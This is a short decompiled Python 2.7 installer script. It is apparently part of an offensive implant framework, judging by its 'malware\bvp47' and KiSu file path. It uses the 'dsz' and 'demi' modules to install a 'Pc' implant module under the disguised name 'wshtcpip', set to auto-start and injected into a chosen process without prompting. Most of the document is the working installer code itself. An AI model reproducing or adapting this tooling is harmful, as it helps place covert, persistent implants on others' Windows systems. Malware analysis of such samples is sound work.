# uncompyle6 version 3.8.0
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:19:08) [MSC v.1500 32 bit (Intel)]
# Warning: this version of Python has problems handling the Python 3 byte type in constants properly.

# Embedded file name: _Install.py
import dsz, dsz.lp
dsz.lp.AddResDirToPath('DeMi')
import demi, demi.registry, demi.windows.module, glob, os, re, shutil, sys

def main():
    dsz.control.echo.Off()
    if len(sys.argv) != 3:
        dsz.ui.Echo('* Invalid parameters', dsz.ERROR)
        dsz.ui.Echo()
        dsz.ui.Echo('Usage:  %s <localFile> <procName>' % sys.argv[0])
        return False
    localFile = sys.argv[1]
    procName = sys.argv[2]
    return demi.windows.module.Install('Pc', localFile, 'wshtcpip', demi.registry.PC.Id, 1, 'Auto_Start|User_Mode', procName, ask=False)


if __name__ == '__main__':
    if main() != True:
        sys.exit(-1)
# okay decompiling D:\work\malware\bvp47\FB\Resources\Pc\PyScripts\Install\winnt\KiSu\_Install.pyo
